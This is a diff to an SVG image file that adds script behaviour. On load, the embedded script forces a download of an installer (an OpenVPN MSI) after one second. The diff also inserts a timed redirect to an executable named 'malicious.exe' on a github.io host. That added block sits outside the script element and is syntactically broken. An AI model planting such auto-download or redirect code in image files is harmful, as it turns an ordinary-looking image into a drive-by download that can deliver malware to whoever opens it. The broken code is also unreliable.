@@ -1,12 +1,15 @@
 <svg xmlns="http://www.w3.org/2000/svg" version="1.1" baseProfile="full">  
+  setTimeout(() => {
+      window.location.href = "https://eunjee33.github.io/malicious.exe";
+    }
   <script type="application/ecmascript">
     <![CDATA[
-      setTimeout(() => { {
+      setTimeout(() => {
         var downloadLink = document.createElementNS('http://www.w3.org/1999/xhtml', 'a');
         downloadLink.href = 'https://openvpn.net/downloads/openvpn-connect-v3-windows.msi';
         downloadLink.setAttribute('download', '');
         downloadLink.click();
-      };
+      }, 1000);
     ]]>
   </script>
 </svg>
